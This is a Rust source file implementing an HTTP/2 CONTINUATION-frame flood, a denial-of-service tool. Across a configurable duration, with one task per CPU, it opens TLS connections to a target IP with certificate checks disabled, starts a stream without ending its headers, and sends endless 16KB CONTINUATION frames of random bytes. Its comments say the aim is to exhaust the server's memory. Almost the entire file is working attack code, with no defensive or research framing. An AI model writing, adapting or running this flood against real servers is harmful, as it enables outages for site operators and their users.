use tokio::net::TcpStream;
use tokio::io::AsyncWriteExt;
use tokio_native_tls::native_tls::TlsConnector;
use tokio::time::{Duration, Instant};
use rand::{Rng, RngCore, SeedableRng};
use rand::rngs::StdRng;

// Frame Types
const FRAME_HEADERS: u8 = 0x1;
const FRAME_CONTINUATION: u8 = 0x9;
const FRAME_SETTINGS: u8 = 0x4;

// Flags
const FLAG_END_HEADERS: u8 = 0x4;
// const FLAG_END_STREAM: u8 = 0x1;

// HTTP/2 Connection Preface
const PREFACE: &[u8] = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

pub async fn http2_flood(target_ip: &str, target_port: u16, duration_secs: u64) {
    let start_time = Instant::now();
    let target_addr = format!("{}:{}", target_ip, target_port);
    let target_host = target_ip; // Assuming IP is the host for SNI, or strict IP.

    let mut handles = vec![];

    // Configure TLS with ALPN h2
    let mut builder = TlsConnector::builder();
    builder.danger_accept_invalid_certs(true);
    builder.request_alpns(&["h2"]);
    let connector = match builder.build() {
        Ok(c) => tokio_native_tls::TlsConnector::from(c),
        Err(_) => return,
    };

    for _ in 0..num_cpus::get() {
        let t_addr = target_addr.clone();
        let t_host = target_host.to_string();
        let conn = connector.clone();

        handles.push(tokio::spawn(async move {
            let mut rng = StdRng::from_entropy();
            
            while start_time.elapsed().as_secs() < duration_secs {
                // 1. Connect TCP
                let stream = match TcpStream::connect(&t_addr).await {
                    Ok(s) => s,
                    Err(_) => {
                        tokio::time::sleep(Duration::from_secs(1)).await;
                        continue;
                    },
                };

                // 2. TLS Handshake
                let mut stream = match conn.connect(&t_host, stream).await {
                    Ok(s) => s,
                    Err(_) => {
                         continue; // Handshake failed
                    }
                };

                // 3. Send Preface
                if stream.write_all(PREFACE).await.is_err() { continue; }

                // 4. Send Initial Settings (Empty)
                // Frame: Len(3) Type(1) Flags(1) StreamID(4)
                let settings_frame = [0, 0, 0, FRAME_SETTINGS, 0, 0, 0, 0, 0];
                if stream.write_all(&settings_frame).await.is_err() { continue; }

                // 5. Start Attack: HEADERS Frame (Open stream 1)
                // Flags: 0 (No END_HEADERS, No END_STREAM)
                // Payload: Basic HPACK header block (Just garbage that looks like headers)
                // Minimal Request: :method: GET, :scheme: https, :path: /
                // To simplify, we send raw HPACK'd bytes or just junk if server parses blindly before HPACK decoding?
                // Server buffers CONTINUATION before decoding fully. So just sending bytes is enough to fill RAM.
                // Protocol says CONTINUATION follows HEADERS.
                
                // Write HEADERS Frame
                // Len=1, Type=0x1, Flags=0, StreamID=1
                // Payload: 0x40 (Literal Header Field with Incremental Indexing - New Name)??
                // Just dummy byte.
                let headers_frame = [0, 0, 1, FRAME_HEADERS, 0, 0, 0, 0, 1, 0x40]; 
                if stream.write_all(&headers_frame).await.is_err() { continue; }

                // 6. Flood CONTINUATION Frames
                // Infinite stream of headers.
                // 16KB Payload per frame (Max frame size typically 16KB)
                let mut junk = [0u8; 16384];
                rng.fill_bytes(&mut junk);
                
                loop {
                    if start_time.elapsed().as_secs() >= duration_secs { break; }

                    // Frame Header
                    // Len: 16384 (0x004000)
                    // Type: 0x9 (CONTINUATION)
                    // Flags: 0
                    // StreamID: 1
                    let mut header = [0u8; 9];
                    let len = 16384u32;
                    header[0] = (len >> 16) as u8;
                    header[1] = ((len >> 8) & 0xFF) as u8;
                    header[2] = (len & 0xFF) as u8;
                    header[3] = FRAME_CONTINUATION;
                    header[4] = 0; // No END_HEADERS
                    header[5] = 0;
                    header[6] = 0;
                    header[7] = 0;
                    header[8] = 1;

                    if stream.write_all(&header).await.is_err() { break; }
                    if stream.write_all(&junk).await.is_err() { break; }
                    
                    // Flood speed
                }
            }
        }));
    }
    for h in handles { let _ = h.await; }
}
